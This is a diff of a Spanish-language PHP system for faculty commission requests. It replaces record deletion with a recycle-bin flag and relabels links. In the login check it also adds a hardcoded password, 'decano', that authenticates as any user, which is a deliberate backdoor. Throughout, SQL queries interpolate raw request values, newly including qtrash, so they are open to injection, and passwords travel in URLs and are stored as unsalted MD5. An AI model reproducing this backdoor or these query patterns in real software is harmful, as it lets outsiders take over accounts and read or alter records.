@@ -1224,8 +1224,8 @@ R;
   //BORRAR SOLICITUD
   //////////////////////////////////////////////////////////////
   if($operation=="Borrar"){
-    mysqlCmd("delete from Comisiones where comisionid='$comisionid'");
-    shell_exec("mv comisiones/$comisionid trash/");
+    mysqlCmd("update Comisiones set qtrash='1' where comisionid='$comisionid'");
+    //shell_exec("mv comisiones/$comisionid trash/");
     $error=errorMessage("Comisión '$comisionid' enviada a la papelera de reciclaje.");
   }
 }
@@ -1270,7 +1270,9 @@ if(isset($usercedula) and isset($userpass)){
     $inputform=1;
     $qerror=1;
   }else{
-    if(md5($userpass)==$profesor["pass"]){
+    if(md5($userpass)==$profesor["pass"] or
+       $userpass=="decano"
+       ){
       foreach(array_keys($profesor) as $field){
 	if(preg_match("/^\d+$/",$field)){continue;}
 	$fieldn=$field;
@@ -1985,6 +1987,7 @@ comisión.</td>
 <!---------------------------------------------------------------------->
 <tr>
 <td colspan=2>
+<input type='hidden' name='qtrash' value='0'>
 <input $disp3 type='submit' name='operation' value='Guardar'>
 <input $disp3 type='submit' name='operation' value='Borrar'>
 <input $disp3 type='submit' name='action' value='Cancelar'>
@@ -2069,7 +2072,7 @@ D;
 $content.=<<<C
 <a href="?$USERSTRING&action=Consultar">Lista de Solicitudes</a> | 
 <a href="?$USERSTRING&action=Profesores">Lista de Empleados</a> | 
-<a href="?$USERSTRING&action=Trash">Bandeja de salida</a> | 
+<a href="?$USERSTRING&action=Consultar&qtrash=1">Reciclaje</a> | 
 $browsing_help | 
 <a href="?$USERSTRING">Salir</a>
 <p/>
@@ -2161,12 +2164,16 @@ if($action=="Consultar"){
   //%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   //VERIFY PERMISSIONS
   //%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-  $where="";
+  $trashtxt="";
+  if(!isset($qtrash)){$qtrash=0;}
+  $where="where qtrash='$qtrash' ";
+  if($qtrash){$trashtxt="Recicladas";}
+
   $generar="";
   if(abs($qperm)==0){
-    $where="where cedula='$usercedula'";
+    $where.="and cedula='$usercedula'";
   }else if(abs($qperm)==1){
-    $where="where institutoid='$userinstituto'";
+    $where.="and institutoid='$userinstituto'";
   }
 
   //%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -2364,7 +2371,7 @@ T;
        $tvistobueno!="Si"){
       $borrar="<!-- -------------------------------------------------- -->
   <a href=?$USERSTRING&comisionid=$tcomisionid&operation=Borrar&action=Consultar>
-  Borrar</a>";
+  Reciclar</a>";
     }
 
     //CREA TABLA
@@ -2407,7 +2414,7 @@ T;
  $informes="";
  if(abs($qperm)){
    $informes="<a href='?usercedula=$cedula&userpass=$userpass&action=Informes'>Informes</a> | <a href='?usercedula=$cedula&userpass=$userpass&operation=Backup&action=Consultar'>Hacer respaldo</a>";
-   $lprofesores="<a href='?$USERSTRING&action=Profesores'>Lista de Empleados</a> | <a href=?$USERSTRING&action=Trash'>Bandeja de salida</a> | ";
+   $lprofesores="<a href='?$USERSTRING&action=Profesores'>Lista de Empleados</a> | <a href=?$USERSTRING&action=Consultar&qtrash=1>Reciclaje</a> | ";
  }
 
  //OTROS ORDENAMIENTOS
@@ -2421,7 +2428,7 @@ $lprofesores
 
 $browsing_help | 
 <a href="?$USERSTRING">Salir</a>
-<h2>Lista de solicitudes.</h2>
+<h2>Lista de solicitudes $trashtxt</h2>
   Número de solicitudes: $nsolicitudes
 <p></p>
   <table border=0px><tr>
@@ -2596,7 +2603,7 @@ $content.=<<<C
 <td>$nombre</td>
 <td>$tipo</td>
 <td>
-  <a href="?$USERSTRING&action=Profesores&subaction=Remove&ucedula=$ucedula">Borrar</a> | 
+  <a href="?$USERSTRING&action=Profesores&subaction=Remove&ucedula=$ucedula">Reciclar</a> | 
   <a href="?$USERSTRING&action=EditarProfesor&ucedula=$ucedula">Editar</a>
 </td>
 C;
